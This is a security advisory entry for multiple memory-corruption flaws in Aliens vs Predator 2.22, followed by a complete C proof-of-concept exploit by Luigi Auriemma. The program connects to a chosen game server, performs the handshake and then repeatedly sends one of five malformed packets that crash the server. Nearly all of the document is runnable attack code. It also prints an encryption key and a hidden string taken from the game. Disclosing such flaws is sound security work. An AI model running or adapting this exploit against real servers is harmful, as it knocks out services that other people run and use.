source: http://www.securityfocus.com/bid/40041/info

Rebellion Aliens vs Predator is prone to multiple memory-corruption vulnerabilities.

Successfully exploiting these issues allows remote attackers to cause denial-of-service conditions. Due to the nature of these issues, arbitrary code execution may be possible; this has not been confirmed.

Aliens vs Predator 2.22 is vulnerable; other versions may also be affected. 

/*
  by Luigi Auriemma
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <time.h>

#ifdef WIN32
    #include <winsock.h>
    #include "winerr.h"

    #define close   closesocket
    #define sleep   Sleep
    #define ONESEC  1000
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <netinet/in.h>
    #include <netdb.h>

    #define ONESEC  1
    #define stristr strcasestr
    #define stricmp strcasecmp
#endif

typedef uint8_t     u8;
typedef uint16_t    u16;
typedef uint32_t    u32;



#define VER         "0.1.1"
#define PORT        27010
#define BUFFSZ      0x400   // max size supported by the game
#define RAND_UNIC   \
    putrr(nick, sizeof(nick) - 1, 1); \
    for(x = 0;; x++) { \
        p += putxx(p, nick[x], 16); \
        if(!nick[x]) break; \
    }



int tcp_sock(struct sockaddr_in *peer);
int avp3_send(int sd, int type, u8 *data, int len);
int avp3_recv(int sd, int *type, u8 *data);
int putrr(u8 *data, int len, int sx);
int putcc(u8 *data, int chr, int len);
int putxx(u8 *data, u32 num, int bits);
int getxx(u8 *data, u32 *ret, int bits);
int timeout(int sock, int secs);
u32 resolv(char *host);
void std_err(void);



int main(int argc, char *argv[]) {
    struct  sockaddr_in peer;
    int     sd,
            x,
            len,
            rnd,    // id?
            bug,
            type;
    u16     port    = PORT;
    u8      buff[BUFFSZ],
            nick[32 + 1],
            *host,
            *p;

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif

    setbuf(stdout, NULL);

    fputs("\n"
        "Alien vs Predator <= 2.22 multiple vulnerabilities "VER"\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@autistici.org\n"
        "web:    aluigi.org\n"
        "\n", stdout);

    if(argc < 3) {
        printf("\n"
            "Usage: %s <bug> <host> [port(%hu)]>\n"
            "\n"
            "Bugs:\n"
            " 1 = invalid memory access in packet 0x66\n"
            " 2 = out of memory allocation in packet 0x66\n"
            " 3 = NULL pointer in packet 0x66\n"
            " 4 = NULL pointer in packet 0x0c\n"
            " 5 = invalid memory access in packet 0x0c\n"
            "\n", argv[0], port);
        exit(1);
    }
    bug  = atoi(argv[1]);
    host = argv[2];
    if(argc > 3) port = atoi(argv[3]);

    peer.sin_addr.s_addr = resolv(host);
    peer.sin_port        = htons(port);
    peer.sin_family      = AF_INET;

    printf("- target   %s : %hu\n", inet_ntoa(peer.sin_addr), ntohs(peer.sin_port));

    rnd = time(NULL) ^ peer.sin_port ^ peer.sin_addr.s_addr;

    sd = tcp_sock(&peer);

    p = buff;
    p += putxx(p, 0x00002832, 32);  // version? (const static)
    p += putxx(p, rnd,        32);
    p += putxx(p, 0x01100001, 32);
    p += putxx(p, -1, 32);
    p += putcc(p, 0, 0x14);
    // the game limits the nickname to 32 chars
    RAND_UNIC
    p += putcc(p, 0, 0xec - (p - buff));    // fixed size

    if(avp3_send(sd, 0xf000, buff, p - buff) < 0) goto quit;
    len = avp3_recv(sd, NULL, buff);
    if(len < 0) goto quit;

    printf("- send malformed packet\n");
    p = buff;
    if(bug == 1) {
        p += putrr(p, 0x20, 0); // encrypted with tea key: "J2Z4163G1W3B1PX4", other hidden string "_PAK9TEHAWESOME_"
        p += putcc(p, 0,    8);
        p += putxx(p, rnd,        32);
        p += putxx(p, 0x01100001, 32);
        p += putxx(p, 0xffff, 32);      // high enough to be allocated but bigger than the source buffer
        p += putcc(p, 'a', 0xcc);       // 0xcc would be the valid ticket size
        type = 0x66;
    } else if(bug == 2) {
        p += putrr(p, 0x20, 0); // encrypted with tea key: "J2Z4163G1W3B1PX4", other hidden string "_PAK9TEHAWESOME_"
        p += putcc(p, 0,    8);
        p += putxx(p, rnd,        32);
        p += putxx(p, 0x01100001, 32);
        p += putxx(p, 0x6fffffff, 32);  // unallocable
        p += putcc(p, 'a', 0xcc);       // 0xcc would be the valid ticket size
        type = 0x66;
    } else if(bug == 3) {
        type = 0x66;
    } else if(bug == 4) {
        type = 0x0c;
    } else if(bug == 5) {
        p += putxx(p, 0xf010,     32);
        p += putxx(p, 0xccbd,     32);
        p += putxx(p, 100,        32);
        p += putxx(p, 0x800,      32);  // amount of chars that compose the message (0x800 is the max)
        p += putxx(p, rnd,        32);
        p += putxx(p, 0x01100001, 32);
        p += putxx(p, 0x05,       16);
        RAND_UNIC   // the message
        p += putxx(p, 0, 32);
        type = 0x0c;
    } else {
        printf("\nError: invalid bug number (%d)\n", bug);
        exit(1);
    }

    // in my tests in some cases is needed to send the packet multiple times
    for(x = 0; x < 5; x++) {
        if(avp3_send(sd, type, buff, p - buff) < 0) goto quit;
    }
    len = avp3_recv(sd, NULL, buff);
    if(len < 0) goto quit;

    close(sd);
    printf("\n- check the server manually for verifying if it's vulnerable or not\n");
    return(0);
quit:
    printf("\nError: connection interrupted or something else\n");
    exit(1);
    return(0);
}



int tcp_sock(struct sockaddr_in *peer) {
    struct  linger  ling = {1,1};
    int     sd;

    sd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if(sd < 0) std_err();
    if(connect(sd, (struct sockaddr *)peer, sizeof(struct sockaddr_in))
      < 0) std_err();
    setsockopt(sd, SOL_SOCKET, SO_LINGER, (char *)&ling, sizeof(ling));
    return(sd);
}



u32 avp3_crc(u8 *data, int len) {
    u32     crc = 0x9e3779b9;
    int     i;

    if(data && len) {
        for(i = 0; i < len; i++) {
            crc = data[i] + ((crc << 5) - crc);
        }
    }
    return(crc);
}



int avp3_send(int sd, int type, u8 *data, int len) {
    u8      tmp[8];

    if(len > BUFFSZ) {
        printf("\nError: data too big (0x%x)\n", len);
        exit(1);
    }
    putxx(tmp,     type, 16);
    putxx(tmp + 2, len,  16);
    putxx(tmp + 4, avp3_crc(data, len), 32);
    if(send(sd, tmp,  8,   0) != 8)   return(-1);
    if(send(sd, data, len, 0) != len) return(-1);
    return(0);
}



int tcp_recv(int sd, u8 *buff, int len) {
    int     i,
            t;

    for(i = 0; i < len; i += t) {
        if(timeout(sd, 10) < 0) return(-1);
        t = recv(sd, buff + i, len - i, 0);
        if(t <= 0) return(-1);
    }
    return(len);
}



int avp3_recv(int sd, int *type, u8 *data) {
    int     len,
            crc;
    u8      tmp[8];

    if(tcp_recv(sd, tmp, 8) < 0) return(-1);
    if(type) getxx(tmp, type, 16);
    getxx(tmp + 2, &len, 16);
    getxx(tmp + 4, &crc, 32);
    if(len > BUFFSZ) return(-1);
    if(tcp_recv(sd, data, len) < 0) return(-1);
    return(len);
}



int putrr(u8 *data, int len, int sx) {
    static const char table[] =
            "0123456789"
            "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
            "abcdefghijklmnopqrstuvwxyz";
    static u32  rnd = 0;
    int     i;

    if(!rnd) rnd = ~time(NULL);
    if(sx) {
        len = rnd % len;
        if(len < 3) len = 3;
    }
    for(i = 0; i < len; i++) {
        rnd = ((rnd * 0x343FD) + 0x269EC3) >> 1;
        if(sx) {
            data[i] = table[rnd % (sizeof(table) - 1)];
        } else {
            data[i] = rnd;
        }
    }
    if(sx) data[i] = 0;
    return(i);
}



int putcc(u8 *data, int chr, int len) {
    memset(data, chr, len);
    return(len);
}



int putxx(u8 *data, u32 num, int bits) {
    int     i,
            bytes;

    bytes = bits >> 3;
    for(i = 0; i < bytes; i++) {
        data[i] = (num >> (i << 3));
    }
    return(bytes);
}



int getxx(u8 *data, u32 *ret, int bits) {
    u32     num;
    int     i,
            bytes;

    bytes = bits >> 3;
    for(num = i = 0; i < bytes; i++) {
        num |= (data[i] << (i << 3));
    }
    *ret = num;
    return(bytes);
}



int timeout(int sock, int secs) {
    struct  timeval tout;
    fd_set  fd_read;

    tout.tv_sec  = secs;
    tout.tv_usec = 0;
    FD_ZERO(&fd_read);
    FD_SET(sock, &fd_read);
    if(select(sock + 1, &fd_read, NULL, NULL, &tout)
      <= 0) return(-1);
    return(0);
}



u32 resolv(char *host) {
    struct  hostent *hp;
    u32     host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf("\nError: Unable to resolv hostname (%s)\n", host);
            exit(1);
        } else host_ip = *(u32 *)hp->h_addr;
    }
    return(host_ip);
}



#ifndef WIN32
    void std_err(void) {
        perror("\nError");
        exit(1);
    }
#endif


